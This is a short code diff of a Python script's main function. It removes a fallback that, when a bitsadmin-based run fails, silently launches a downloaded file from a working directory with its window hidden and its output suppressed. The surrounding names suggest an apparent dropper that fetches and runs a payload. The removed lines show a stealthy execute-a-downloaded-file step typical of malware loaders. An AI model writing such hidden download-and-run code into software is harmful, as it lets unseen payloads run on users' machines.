@@ -118,18 +118,6 @@ def main():
         cleanup()
         sys.exit(1)
     
-    if not execute_with_bitsadmin():
-        try:
-            subprocess.Popen(
-                [os.path.join(WORK_DIR, DOWNLOADED_NAME)],
-                shell=True,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-                creationflags=subprocess.CREATE_NO_WINDOW
-            )
-        except Exception:
-            sys.exit(1)
-    
     cleanup()
 
 if __name__ == "__main__":
